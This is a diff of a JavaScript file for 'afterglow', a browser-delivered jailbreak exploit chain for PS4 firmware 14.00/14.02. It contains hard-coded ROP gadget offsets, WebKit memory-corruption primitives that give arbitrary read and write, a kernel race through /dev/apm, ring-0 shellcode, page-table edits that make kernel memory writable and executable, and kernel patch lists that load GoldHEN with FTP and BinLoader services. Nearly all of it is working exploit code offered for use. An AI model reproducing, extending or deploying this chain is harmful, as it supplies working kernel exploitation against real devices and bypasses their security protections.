@@ -1,21 +1,13 @@
-/* ================================================================
-   afterglow · PS4 14.00/14.02
-   CORRIGIDO:
-   - RUN_URL usa payload=hen.bin (não mode=kpstep)
-   - loadPayload sem NOPs que matavam o payload (0x3490, 0x1136)
-   - loadPayload sem readFromUSB("payload.bin") hardcoded
-   - attempt() verifica firmware ANTES de tocar no kernel
-   - loadKpayloadSteps preservado mas NÃO é default
-   ================================================================ */
+/* afterglow · PS4 14.00/14.02 — arquivo único completo */
 
 /* ============ int64 ============ */
 function zeroFill(n,w){w-=n.toString().length;return w>0?new Array(w+(/\./.test(n)?2:1)).join("0")+n:n+""}
 function int64(low,hi){
   this.low=low>>>0;this.hi=hi>>>0;this.backing=null;
   this.add32inplace=function(v){let l=((this.low>>>0)+v&0xffffffff)>>>0,h=this.hi>>>0;if(l<this.low)h++;this.hi=h;this.low=l;
-    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32inplace: overflow");this.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}};
+    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32inplace");this.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}};
   this.add32=function(v){let l=((this.low>>>0)+v&0xffffffff)>>>0,h=this.hi>>>0;if(l<this.low)h++;let r=new int64(l,h);
-    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32: overflow");r.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}return r};
+    if(this.backing!==null){if(this.backing.byteLength<v)throw new Error("int64.add32");r.backing=new Uint8Array(this.backing.buffer,v,this.backing.byteLength-v)}return r};
   this.sub32=function(v){let l=((this.low>>>0)-v&0xffffffff)>>>0,h=this.hi>>>0;if((l>this.low)&0xffffffff)h--;return new int64(l,h)};
   this.sub32inplace=function(v){let l=((this.low>>>0)-v&0xffffffff)>>>0,h=this.hi>>>0;if((l>this.low)&0xffffffff)h--;this.hi=h;this.low=l};
   this.and32=function(v){return new int64(this.low&v,this.hi)};
@@ -26,18 +18,16 @@ function int64(low,hi){
 }
 globalThis.int64=int64;
 
-/* ============ ps4_offsets (14.00 / 14.02) ============ */
+/* ============ ps4_offsets ============ */
 const PS4={};
 PS4["14.00"]={
-  fw_status:"14.00",
-  wk_expm1_builtin:0x2586880,wk_JSFunction_m_function:0x28,
+  fw_status:"14.00",wk_expm1_builtin:0x2586880,wk_JSFunction_m_function:0x28,
   wk_POP_RDI_RET:0x5c480,wk_POP_RSI_RET:0x6e45e,wk_POP_RDX_RET:0x12c5ba,
   wk_POP_RCX_RET:0x1bade,wk_POP_RAX_RET:0x10504,wk_POP_R8_RET:0x9b311,
-  wk_POP_R9_RET:0x1dcfb1,wk_LEAVE_RET:0x182f7,
-  wk_MOV_QWORD_PTR_RDI_RAX_RET:0x548b,wk_PUSH_RDX_POP_RSP_RET:0x2abccaa,
-  wk_MOV_RDI_RSI_30_CALL:0x295f948,wk_POP_RAX_MOV_RAX_JMP_18:0x1d989e3,
-  wk_PUSH_RBP_MOV_RBP_RSP_10:0x25bae0,wk_MOV_RDI_RAX_8_CALL_20:0x4a0406,
-  wk_MOV_RDX_RAX_18_CALL_10:0x1ec3ada,
+  wk_POP_R9_RET:0x1dcfb1,wk_LEAVE_RET:0x182f7,wk_MOV_QWORD_PTR_RDI_RAX_RET:0x548b,
+  wk_PUSH_RDX_POP_RSP_RET:0x2abccaa,wk_MOV_RDI_RSI_30_CALL:0x295f948,
+  wk_POP_RAX_MOV_RAX_JMP_18:0x1d989e3,wk_PUSH_RBP_MOV_RBP_RSP_10:0x25bae0,
+  wk_MOV_RDI_RAX_8_CALL_20:0x4a0406,wk_MOV_RDX_RAX_18_CALL_10:0x1ec3ada,
   pivot_view_sp:0x38,wk_ArrayBuffer_m_impl:0x10,wk_ArrayBuffer_m_contents_m_data:0x10,
   wk___imp___error:0x3cb8cc8,k__error:0x1a0f0,
   wk___imp_pthread_create:0x3cb9c00,k_pthread_create:0x21790,
@@ -123,8 +113,8 @@ function allZero(b,s,e){for(let i=s;i<e;++i)if(b[i]!==0)return false;return true
 function uint32At(b,o){return (b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000)}
 function low48At(b,o){return b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000+b[o+4]*0x100000000+b[o+5]*0x10000000000}
 function readBytes(d,s,c){for(let i=0;i<c;++i)d[i]=s[i]}
-function sameBytes(a,b,c){for(let i=0;i<c;++i)if(a[i]!==b[i])return false;return true}
-function readTwiceMatches(d,s,c){readBytes(d,s,c);return sameBytes(d,s,c)}
+function sameBytes2(a,b,c){for(let i=0;i<c;++i)if(a[i]!==b[i])return false;return true}
+function readTwiceMatches(d,s,c){readBytes(d,s,c);return sameBytes2(d,s,c)}
 function aimCarrier(c,a){const h=Math.floor(a/0x100000000);scratchWords[0]=a-h*0x100000000;scratchWords[1]=h;for(let i=0;i<8;++i)c[0x10+i]=scratchBytes[i]}
 function restoreCarrier(c){for(let i=0;i<8;++i)c[0x10+i]=rwHeader[0x10+i]}
 function pointerFromWords(w,o){if(w[o+3]!==0)return NaN;return w[o]+w[o+1]*0x10000+w[o+2]*0x100000000}
@@ -137,7 +127,7 @@ function emit(t,d){if(onEvent===null)return;try{onEvent(t,d===undefined?"":Strin
 function checkCarrierIdentity(c){
   if(!plausibleAddress(rwOriginalVector)||rwOriginalVector%8!==0||IDENT_OFFSET+8>RW_BUFFER_SIZE)return 0;
   aimCarrier(c,rwOriginalVector+IDENT_OFFSET);readBytes(identityBytes,rwView,8);restoreCarrier(c);
-  return sameBytes(identityBytes,identityMagic,8)&&rwView[0]===0x3c?1:-1;
+  return sameBytes2(identityBytes,identityMagic,8)&&rwView[0]===0x3c?1:-1;
 }
 function runIdentityProof(c){candidateMutationStarted=true;identityResult=checkCarrierIdentity(c);return identityResult===1}
 function ceilingReached(){return attemptCeiling>0&&attemptNumber>=attemptCeiling}
@@ -155,7 +145,7 @@ function releaseAttemptAllocations(){
 function scheduleSafeRetry(reason){
   if(retryScheduled||stopped)return;
   const safe=!candidateEverReturned||(zeroHeaderMiss&&!candidateMutationStarted);
-  if(!retrySafe||!safe||candidateMutationStarted||!attemptPersisted){emit("AUTO-RETRY-NOT-SCHEDULED",`reason=${reason}-safe=${retrySafe}-seen=${candidateEverReturned}-mutated=${candidateMutationStarted}-state=${safe}-persisted=${attemptPersisted}`);failed();return}
+  if(!retrySafe||!safe||candidateMutationStarted||!attemptPersisted){emit("AUTO-RETRY-NOT-SCHEDULED",`reason=${reason}`);failed();return}
   if(ceilingReached()){giveUp("attempt-ceiling");return}
   retryScheduled=true;const next=attemptNumber+1;emit("AUTO-RETRY-SCHEDULED",`reason=${reason}-next=${next}`);releaseAttemptAllocations();
   setTimeout(()=>{
@@ -409,7 +399,7 @@ function toI64(x){
 }
 function addrNumber(x){const a=toI64(x);if(a.hi>0xffff)throw new RangeError(`mem: non-canonical 0x${a.toString()}`);return a.hi*0x100000000+a.low}
 function aimFor(a,size){const ad=addrNumber(a);if(size>carrier.windowBytes)throw new RangeError(`mem: ${size} > ${carrier.windowBytes}`);carrier.aim(ad);return ad}
-function valueLow32(v,who){if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`${who}: non-int ${v}`);return v>>>0}if(v instanceof int64)return v.low>>>0;if(v!==null&&typeof v==="object"&&"low" in v)return toI64(v).low>>>0;throw new TypeError(`${who}: must be number or int64`)}
+function valueLow32(v,who){if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`${who}: non-int ${v}`);return v>>>0}if(v instanceof int64)return v.low>>>0;if(v!==null&&typeof v==="object"&&"low" in v)return toI64(v).low>>>0;throw new TypeError(`${who}`)}
 function read1(a){aimFor(a,1);try{return carrier.view[0]}finally{carrier.restore()}}
 function read2(a){aimFor(a,2);try{const v=carrier.view;return v[0]|(v[1]<<8)}finally{carrier.restore()}}
 function read4(a){aimFor(a,4);try{const v=carrier.view;return (v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24))>>>0}finally{carrier.restore()}}
@@ -419,12 +409,12 @@ function write2(a,v){const x=valueLow32(v,"mem.write2")&0xffff;aimFor(a,2);try{c
 function write4(a,v){const x=valueLow32(v,"mem.write4");aimFor(a,4);try{const w=carrier.view;w[0]=x&0xff;w[1]=(x>>>8)&0xff;w[2]=(x>>>16)&0xff;w[3]=(x>>>24)&0xff}finally{carrier.restore()}}
 function write8(a,v){let lo,hi;
   if(v instanceof int64){lo=v.low>>>0;hi=v.hi>>>0}
-  else if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`mem.write8: non-int ${v}`);
+  else if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`mem.write8: ${v}`);
     if(v<0){if(v<-0x80000000)throw new RangeError(`mem.write8: ${v}`);lo=v>>>0;hi=0xffffffff}
     else if(v<=0xffffffff){lo=v>>>0;hi=0}
     else throw new RangeError(`mem.write8: ${v}`)}
   else if(v!==null&&typeof v==="object"&&"low" in v){const n=toI64(v);lo=n.low;hi=n.hi}
-  else throw new TypeError("mem.write8: bad value");
+  else throw new TypeError("mem.write8");
   aimFor(a,8);try{const w=carrier.view;w[0]=lo&0xff;w[1]=(lo>>>8)&0xff;w[2]=(lo>>>16)&0xff;w[3]=(lo>>>24)&0xff;w[4]=hi&0xff;w[5]=(hi>>>8)&0xff;w[6]=(hi>>>16)&0xff;w[7]=(hi>>>24)&0xff}finally{carrier.restore()}}
 function leakval(obj){
   if(obj===null||(typeof obj!=="object"&&typeof obj!=="function"))throw new TypeError("mem.leakval: not object");
@@ -450,8 +440,8 @@ function pairRestore(){for(let i=0;i<8;++i)mainView[pairVectorOffset+i]=workerOr
 function buildPairCarrier(fake){
   const validate=fake.validate;
   return{
-    aim(a){if(mainView===null||workerView===null)throw new Error("mem.pair.aim: dropped");if(!validate(a))throw new RangeError(`mem.pair.aim: ${a}`);pairAim(a)},
-    restore(){if(mainView===null)throw new Error("mem.pair.restore: dropped");pairRestore()},
+    aim(a){if(mainView===null||workerView===null)throw new Error("mem.pair.aim");if(!validate(a))throw new RangeError(`mem.pair.aim: ${a}`);pairAim(a)},
+    restore(){if(mainView===null)throw new Error("mem.pair.restore");pairRestore()},
     get view(){return workerView},windowBytes:WORKER_BUFFER_SIZE,
     holder:fake.holder,holderAddress:fake.holderAddress,leakSlotOffset:fake.leakSlotOffset,leakSlotAddress:fake.leakSlotAddress,
     setLeakSlot:fake.setLeakSlot,clearLeakSlot:fake.clearLeakSlot,anchorObject:fake.anchorObject,anchorObjectAddress:fake.anchorObjectAddress,
@@ -460,13 +450,12 @@ function buildPairCarrier(fake){
     assertHome(){if(workerView===null||workerMirror===null)return false;return workerView[0]===HOME_BYTE&&workerMirror[0]===HOME_BYTE}
   };
 }
-function brokenCarrier(why){const die=()=>{throw new Error("mem: primitive disabled -- rollback did not verify ("+why+")")};
+function brokenCarrier(why){const die=()=>{throw new Error("mem: primitive disabled ("+why+")")};
   return{aim:die,restore:die,setLeakSlot:die,clearLeakSlot:die,get view(){return die()},get windowBytes(){return die()},get leakSlotAddress(){return die()},validate:()=>false,assertHome:()=>false,profile:null,pair:pairStatus}}
 function readInto(dest,addr,count){const base=addrNumber(addr);let done=0;while(done<count){const chunk=Math.min(count-done,carrier.windowBytes);aimFor(base+done,chunk);try{for(let i=0;i<chunk;++i)dest[done+i]=carrier.view[i]}finally{carrier.restore()}done+=chunk}return dest}
 function proveMagic(note,who,slot,at,expected,context){
   const target=toI64(at),record={at:target,expected:hexOf(expected,8),found:null,pass:false};
   pairStatus[slot]=record;readInto(identityBytes,at,8);record.found=hexOf(identityBytes,8);record.pass=sameB(identityBytes,expected,8);
-  note(`PAIR-IDENTITY-${who.toUpperCase()}`,`at=0x${target.toString()}-found=${record.found}-expected=${record.expected}-pass=${record.pass}-${context}`);
   if(!record.pass)throw new Error(`mem.promote: ${who} identity failed`);
   return record;
 }
@@ -474,69 +463,69 @@ function promoteToRealPair(onEvent){
   const note=(tag,detail)=>{pairStatus.stage=tag;if(typeof onEvent==="function")try{onEvent(tag,detail===undefined?"":String(detail))}catch(e){}};
   if(pairStatus.promoted)throw new Error("mem.promote: already promoted");
   if(carrier===null||typeof carrier.aim!=="function")throw new TypeError("mem.promote: no carrier");
-  if(fakeCellReleased())throw new Error("mem.promote: core already released fake cell");
+  if(fakeCellReleased())throw new Error("mem.promote: released");
   const fake=carrier,profile=fake.profile;
-  if(!profile||typeof profile.vectorOffset!=="number"||typeof profile.butterflyOffset!=="number"||typeof profile.inlineSlotOffset!=="number")throw new TypeError("mem.promote: no layout profile");
-  if(typeof fake.hostAddress!=="number"||!fake.validate(fake.hostAddress)||typeof fake.fakeAddress!=="number"||!fake.validate(fake.fakeAddress)||fake.fakeAddress-fake.hostAddress!==profile.inlineSlotOffset)throw new TypeError("mem.promote: fake cell unusable");
+  if(!profile||typeof profile.vectorOffset!=="number"||typeof profile.butterflyOffset!=="number"||typeof profile.inlineSlotOffset!=="number")throw new TypeError("mem.promote: no profile");
+  if(typeof fake.hostAddress!=="number"||!fake.validate(fake.hostAddress)||typeof fake.fakeAddress!=="number"||!fake.validate(fake.fakeAddress)||fake.fakeAddress-fake.hostAddress!==profile.inlineSlotOffset)throw new TypeError("mem.promote: fake cell");
   const VECTOR_OFF=profile.vectorOffset,LENGTH_OFF=VECTOR_OFF+8,MODE_OFF=LENGTH_OFF+4,BUTTERFLY_OFF=profile.butterflyOffset;
   pairStatus.vectorOffset=VECTOR_OFF;pairStatus.lengthOffset=LENGTH_OFF;pairStatus.modeOffset=MODE_OFF;pairStatus.butterflyOffset=BUTTERFLY_OFF;
   let committed=false,rebound=false;
   try{
-    note("PAIR-BEGIN",`window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);
+    note("PAIR-BEGIN",`window=${fake.windowBytes}`);
     const mainRecord=carrierHeaderCopy(),mainHomeVector=carrierHomeVector();
     if(!(mainRecord instanceof Uint8Array)||mainRecord.length<PAIR_HEADER_BYTES)throw new Error("mem.promote: bad record");
     const recordVector=low48At2(mainRecord,VECTOR_OFF);
     pairStatus.mainVector=toI64(mainHomeVector);pairStatus.mainRecordVector=toI64(recordVector);pairStatus.mainWindow=u32At(mainRecord,LENGTH_OFF);pairStatus.structureID=u32At(mainRecord,0);
     if(recordVector!==mainHomeVector)throw new Error("mem.promote: vectorOffset != home");
-    if(!fake.validate(mainHomeVector)||mainHomeVector%8!==0)throw new Error("mem.promote: bad home vector");
-    if(pairStatus.mainWindow!==fake.windowBytes)throw new Error("mem.promote: record m_length != window");
+    if(!fake.validate(mainHomeVector)||mainHomeVector%8!==0)throw new Error("mem.promote: bad home");
+    if(pairStatus.mainWindow!==fake.windowBytes)throw new Error("mem.promote: m_length != window");
     mainView=fake.view;retained.push(mainView);
-    if(!(mainView instanceof Uint8Array)||mainView.length!==fake.windowBytes||MAIN_IDENT_OFFSET+8>fake.windowBytes)throw new Error("mem.promote: view != description");
+    if(!(mainView instanceof Uint8Array)||mainView.length!==fake.windowBytes||MAIN_IDENT_OFFSET+8>fake.windowBytes)throw new Error("mem.promote: view");
     pairStatus.fakeAddress=toI64(fake.fakeAddress);pairStatus.fakeButterfly=read8(fake.fakeAddress+BUTTERFLY_OFF);
     workerBuffer=new ArrayBuffer(WORKER_BUFFER_SIZE);workerView=new Uint8Array(workerBuffer);workerMirror=new Uint8Array(workerBuffer);
     retained.push(workerBuffer,workerView,workerMirror);workerMirror[0]=HOME_BYTE;
     for(let i=0;i<8;++i)workerMirror[PAIR_IDENT_OFFSET+i]=workerMagic[i];
-    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: workerView != mirror");
+    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: mirror");
     for(let i=0;i<8;++i)mainView[MAIN_IDENT_OFFSET+i]=mainMagic[i];
-    for(let i=0;i<8;++i)if(mainView[MAIN_IDENT_OFFSET+i]!==mainMagic[i])throw new Error("mem.promote: main magic");
+    for(let i=0;i<8;++i)if(mainView[MAIN_IDENT_OFFSET+i]!==mainMagic[i])throw new Error("mem.promote: magic");
     const mainAddr=addrNumber(leakval(mainView)),workerAddr=addrNumber(leakval(workerView));
     pairStatus.mainAddress=toI64(mainAddr);pairStatus.workerAddress=toI64(workerAddr);
     if(mainAddr===workerAddr)throw new Error("mem.promote: same cell");
-    if(mainAddr%0x10!==0||workerAddr%0x10!==0)throw new Error("mem.promote: not atom-aligned");
+    if(mainAddr%0x10!==0||workerAddr%0x10!==0)throw new Error("mem.promote: align");
     const fromFakeSlot=read8(fake.fakeAddress+VECTOR_OFF);
-    if(fromFakeSlot.low!==pairStatus.mainAddress.low||fromFakeSlot.hi!==pairStatus.mainAddress.hi)throw new Error("mem.promote: CELL identity failed");
+    if(fromFakeSlot.low!==pairStatus.mainAddress.low||fromFakeSlot.hi!==pairStatus.mainAddress.hi)throw new Error("mem.promote: CELL");
     proveMagic(note,"main","mainIdentity",mainHomeVector+MAIN_IDENT_OFFSET,mainMagic,"ok");
     readInto(workerHeader,workerAddr,PAIR_HEADER_BYTES);
     const workerVector=low48At2(workerHeader,VECTOR_OFF),workerButterfly=low48At2(workerHeader,BUTTERFLY_OFF);
     pairStatus.mode=workerHeader[MODE_OFF];pairStatus.workerWindow=u32At(workerHeader,LENGTH_OFF);
     pairStatus.workerVector=toI64(workerVector);pairStatus.workerButterfly=toI64(workerButterfly);
     const gate=u32At(workerHeader,0)===pairStatus.structureID&&(workerHeader[7]===0||workerHeader[7]===1)&&pairStatus.workerWindow===WORKER_BUFFER_SIZE&&workerHeader[MODE_OFF]===mainRecord[MODE_OFF]&&workerHeader[MODE_OFF+1]===0&&workerHeader[MODE_OFF+2]===0&&workerHeader[MODE_OFF+3]===0&&canonical48(workerHeader,BUTTERFLY_OFF)&&workerButterfly>0x100000000&&workerButterfly%8===0&&canonical48(workerHeader,VECTOR_OFF)&&fake.validate(workerVector)&&workerVector%8===0&&workerVector!==mainHomeVector;
-    if(!gate)throw new Error("mem.promote: header gate failed");
+    if(!gate)throw new Error("mem.promote: gate");
     proveMagic(note,"worker","workerIdentity",workerVector+PAIR_IDENT_OFFSET,workerMagic,"ok");
     for(let i=0;i<8;++i)workerOriginalVector[i]=workerHeader[VECTOR_OFF+i];
     for(let i=0;i<4;++i)workerOriginalLength[i]=workerHeader[LENGTH_OFF+i];
     aimFor(workerAddr,PAIR_HEADER_BYTES);committed=true;pairStatus.committed=true;
     for(let i=0;i<4;++i)mainView[LENGTH_OFF+i]=0xff;pairStatus.workerLength=workerView.length;
-    if(pairStatus.workerLength!==WORKER_LENGTH_MAX)throw new Error("mem.promote: widening failed");
-    if(workerMirror.length!==WORKER_BUFFER_SIZE)throw new Error("mem.promote: mirror widened");
-    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: worker lost buffer");
-    if(mainView[MODE_OFF]!==workerHeader[MODE_OFF]||mainView[MODE_OFF+1]!==0||mainView[MODE_OFF+2]!==0||mainView[MODE_OFF+3]!==0)throw new Error("mem.promote: m_mode disturbed");
+    if(pairStatus.workerLength!==WORKER_LENGTH_MAX)throw new Error("mem.promote: widening");
+    if(workerMirror.length!==WORKER_BUFFER_SIZE)throw new Error("mem.promote: mirror width");
+    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: lost buffer");
+    if(mainView[MODE_OFF]!==workerHeader[MODE_OFF]||mainView[MODE_OFF+1]!==0||mainView[MODE_OFF+2]!==0||mainView[MODE_OFF+3]!==0)throw new Error("mem.promote: m_mode");
     for(let i=0;i<8;++i)if(mainView[VECTOR_OFF+i]!==workerOriginalVector[i])throw new Error("mem.promote: vector moved");
     pairVectorOffset=VECTOR_OFF;carrier=buildPairCarrier(fake);rebound=true;
     readInto(identityBytes,workerVector+PAIR_IDENT_OFFSET,8);
-    if(!sameB(identityBytes,workerMagic,8))throw new Error("mem.promote: read through pair wrong");
+    if(!sameB(identityBytes,workerMagic,8))throw new Error("mem.promote: read wrong");
     write8(workerVector+PAIR_IDENT_OFFSET,new int64(0x0d0c0b0a,0x04030201));
     const back=[0x0a,0x0b,0x0c,0x0d,0x01,0x02,0x03,0x04];
-    for(let i=0;i<8;++i)if(workerMirror[PAIR_IDENT_OFFSET+i]!==back[i])throw new Error("mem.promote: write through pair failed");
+    for(let i=0;i<8;++i)if(workerMirror[PAIR_IDENT_OFFSET+i]!==back[i])throw new Error("mem.promote: write failed");
     for(let i=0;i<8;++i)workerMirror[PAIR_IDENT_OFFSET+i]=workerMagic[i];
     const workerAgain=addrNumber(leakval(workerView));pairStatus.leakvalAgrees=workerAgain===workerAddr;
-    if(!pairStatus.leakvalAgrees)throw new Error("mem.promote: leakval through pair disagrees");
+    if(!pairStatus.leakvalAgrees)throw new Error("mem.promote: leakval");
     const mv=read8(mainAddr+VECTOR_OFF);
-    if(mv.low!==pairStatus.workerAddress.low||mv.hi!==pairStatus.workerAddress.hi)throw new Error("mem.promote: main.m_vector wrong");
-    if(read4(mainAddr+LENGTH_OFF)!==fake.windowBytes)throw new Error("mem.promote: main m_length disturbed");
+    if(mv.low!==pairStatus.workerAddress.low||mv.hi!==pairStatus.workerAddress.hi)throw new Error("mem.promote: main.m_vector");
+    if(read4(mainAddr+LENGTH_OFF)!==fake.windowBytes)throw new Error("mem.promote: m_length");
     const rel=releaseFakeCell();pairStatus.released=rel.released;pairStatus.historyCleared=!!rel.historyCleared;
-    if(!fakeCellReleased())throw new Error("mem.promote: core did not release");
-    if(fake.assertHome()!==false)throw new Error("mem.promote: core carrier still live");
+    if(!fakeCellReleased())throw new Error("mem.promote: not released");
+    if(fake.assertHome()!==false)throw new Error("mem.promote: still live");
     pairStatus.promoted=true;pairStatus.state="pair";pairStatus.error=null;
     note("PAIR-UP","ok");return pairStatus;
   }catch(error){
@@ -562,7 +551,7 @@ function installWindowP(c,options){
   const opts=options||{};
   if(opts.promote===false){pairStatus.state="disabled";pairStatus.stage="disabled";pairStatus.error="promotion disabled";return prim}
   try{promoteToRealPair(opts.onEvent)}catch(e){
-    if(pairStatus.state==="broken"){globalThis.p=undefined;throw new Error(`mem: promotion failed AND rollback did not verify -- window.p withdrawn. ${pairStatus.error}`)}
+    if(pairStatus.state==="broken"){globalThis.p=undefined;throw new Error(`mem: promotion failed AND rollback did not verify. ${pairStatus.error}`)}
   }
   return prim;
 }
@@ -592,9 +581,33 @@ const PATCHES=[
   [0x01b7504,"90e9","load_prx"],[0x01b7ab8,"90e93c01","dlsym open"],[0x0628684,"eb00","self verification"],
   [0x0628f6f,"eb00","delayed panic suspend"]
 ];
+const GH_STEPS=[
+  [0x12f35,"detect firmware, fill the pointer table"],
+  [0x9ba88,"UI notice 'GoldHEN'",{ptr:true,rdi:0x99eeb,esi:0x1f4}],
+  [0x5cc6,"save the original pointer from [0x9b8c0]"],
+  [0x945,"kernel patches A"],[0xf92,"kernel patches B"],
+  [0x2a4d,"testkit fake, kernel patches, ShellCore/ShellUI patches"],
+  [0x244e,"syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
+  [0x3306,"0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
+  [0x12f53,"notice 'GoldHEN v2.4b18.12 loaded!'",{rdi:0x99ef3,esi:0}],
+  [0x32c4,"inject klog      -> 3232"],[0x325a,"inject FTP       -> 2121"],
+  [0x328f,"inject BinLoader -> 9090"],[0x31af,"inject mono ELF  -> SceShellUI"],
+  [0x1dd,"last hook on sysent[591]; turns write protection back on"],
+  [0x9bad0,"klog line '[GoldHEN] All done!'",{ptr:true,rdi:0x99f1e}]
+];
+const KP_STEPS=[
+  [0x11bd1,"init: firmware detect + import/offset tables"],
+  [0x5cf3,"patch group 1"],[0xa65,"patch group 2"],[0x10b2,"patch group 3"],
+  [0x2b6d,"patch group 4 (testkit + shell)"],
+  [0x256e,"patch group 5 (syscalls 11/c5/c6)"],
+  [0x3426,"patch group 6 (54 kernel patches + exec handler)"]
+];
+const PT={g1:0x1b2c394,g2:0x1b2c398,kphys:0x1b2c420,pmpml4:0x1b2c3c0,padFrom:0x10ff000,padTo:0x11ff000};
+const PADDING=0x0b3a300,OFF_STUB=0x100,OFF_DEVS=0x110,OFF_QUEUES=0x170,RET0=0x00c3c031;
+const GATE=0x0a0,BODY=0x0c0,OUT=0x400,FLAG=0x420,STAGE=0x440,STAGE_MAX=0x400,SIGIL=0x600D600D;
 const STATE={ctx:null,units:{},clones:0,base:null,stubs:{},batch:undefined,retry:false};
 function host(){if(!STATE.ctx)throw new Error("afterglow: no host");return STATE.ctx}
-function say(fmt){host().mark("AG",fmt);try{if(/^\[(e|g|p|t|8|9|10|kp|rw|0|dbg)\]/.test(fmt)||/JAILBREAK|defused|thread rc|pthread_create/.test(fmt))fetch("ag_log?m="+encodeURIComponent(fmt),{keepalive:true}).catch(function(){})}catch(e){}}
+function say(fmt){host().mark("AG",fmt);try{if(/^\[(e|g|p|t|8|9|10|kp|rw|dbg|usb)\]/.test(fmt)||/JAILBREAK|defused|thread rc|pthread_create/.test(fmt))fetch("ag_log?m="+encodeURIComponent(fmt),{keepalive:true}).catch(function(){})}catch(e){}}
 const LOW=0x100000000;
 function v(low,hi){return new int64(low>>>0,(hi||0)>>>0)}
 function plus(a,n){return n<0?a.sub32(-n):a.add32(n)}
@@ -673,7 +686,7 @@ function shooter(gad){
     let unit=-1,watched=-1;const refused=[];
     for(let u=TUNE.ceiling;u>=0;u--){if(STATE.units[u])continue;const fd=this.hold("/dev/apm"+u);
       if(fd>=0){unit=u;watched=fd;break}if(refused.length<4)refused.push(u+":e"+host().errno())}
-    if(unit<0){this.why="no apm unit 0.."+TUNE.ceiling+" ("+Object.keys(STATE.units).length+" spent)";return null}
+    if(unit<0){this.why="no apm unit";return null}
     STATE.units[unit]=true;this.fired++;
     const doomed=sc(S.open,cstr("/dev/apm"+unit).at,0).i32;
     if(doomed<0){this.why="second open refused";return null}
@@ -716,7 +729,6 @@ function shooter(gad){
 }
 function ran(r){return r!==null&&r===-1}
 function qAt(buf,off){return v(buf.dv.getUint32(off,true),buf.dv.getUint32(off+4,true))}
-const GATE=0x0a0,BODY=0x0c0,OUT=0x400,FLAG=0x420,STAGE=0x440,STAGE_MAX=0x400,SIGIL=0x600D600D;
 function openRing0(roomAt){
   const r={at:roomAt,body:codeAt(roomAt,BODY)};
   codeAt(roomAt,GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
@@ -804,7 +816,6 @@ function pinCore(){
   rv=sc(S.cpuset_setaffinity,3,1,-1,16,mask.at).i32;
   return{ok:rv===0,core,allowed:allowed.join(","),note:"setaffinity rv="+rv};
 }
-const PT={g1:0x1b2c394,g2:0x1b2c398,kphys:0x1b2c420,pmpml4:0x1b2c3c0,padFrom:0x10ff000,padTo:0x11ff000};
 function paddingRW(k,kbase){
   const rd=function(a2){return k.read_v(a2)};const kat=function(rva){return plus(kbase,rva)};
   const g1=rd(kat(PT.g1)),g2=rd(kat(PT.g2));
@@ -815,7 +826,7 @@ function paddingRW(k,kbase){
   const p4=v((dmap.low+kph.low)>>>0,(dmap.hi+kph.hi+(((dmap.low>>>0)+(kph.low>>>0)>0xffffffff)?1:0))>>>0);
   const pm=rd(kat(PT.pmpml4));
   if(!pm||!same(pm,p4)){say("[rw] kernel_pmap->pm_pml4 is "+(pm?text(pm):"unreadable")+", calc "+text(p4));return null}
-  say("[rw] dmap "+text(dmap)+", pml4 "+text(p4)+" confirmed");
+  say("[rw] dmap "+text(dmap)+", pml4 "+text(p4)+" confirmed against kernel_pmap");
   const target=kat(PT.padFrom);
   const i4=(target.hi>>>7)&511;const i3=(((target.low>>>30)&3)|((target.hi&127)<<2))&511;const i2=(target.low>>>21)&511;
   const viaDmap=function(ent){const pl=(ent.low&0xfffff000)>>>0,ph=(ent.hi&0x000fffff)>>>0;
@@ -837,7 +848,6 @@ function paddingRW(k,kbase){
   say("[rw] RW+X set on pd entry at "+text(e2at)+", dmap "+text(dmapPad));
   return dmapPad;
 }
-const PADDING=0x0b3a300,OFF_STUB=0x100,OFF_DEVS=0x110,OFF_QUEUES=0x170,RET0=0x00c3c031;
 function rehangRing0(k,room,ofs,list,from,copy){
   if(!list.length||list.length>256||!from)return null;
   for(let i=0;i<list.length;i++)wr4(plus(room,STAGE+i*4),list[i]);
@@ -866,16 +876,14 @@ function teardown(k,kbase,ofs,devs,queues,room){
   const kat=function(rva){return plus(kbase,rva)};
   const fileOf=function(fd){return k.read_v(plus(ofs,fd*8))};
   const stub=kat(PADDING+OFF_STUB),dtab=kat(PADDING+OFF_DEVS),qtab=kat(PADDING+OFF_QUEUES);
-  say("[t] reading padding at "+text(stub));
   const there=k.read_v(stub);
-  if(!there){say("[t] kernel text not readable at "+text(stub));return false}
-  say("[t] it holds "+text(there));
+  if(!there){say("[t] kernel text not readable");return false}
   if((there.low>>>0)===(RET0>>>0))say("[t] stub already there");
-  else if(isZero(there)){if(!k.write_v(stub,v(RET0,0))){say("[t] kernel text not writable");return false}
-    const back=k.read_v(stub);if(!back||(back.low>>>0)!==(RET0>>>0)){say("[t] stub did not stick");return false}}
-  else{say("[t] something else at "+text(stub));return false}
+  else if(isZero(there)){if(!k.write_v(stub,v(RET0,0))){say("[t] not writable");return false}
+    const back=k.read_v(stub);if(!back||(back.low>>>0)!==(RET0>>>0)){say("[t] did not stick");return false}}
+  else{say("[t] unexpected value at stub: "+text(there));return false}
   const clone=function(from,to,what){
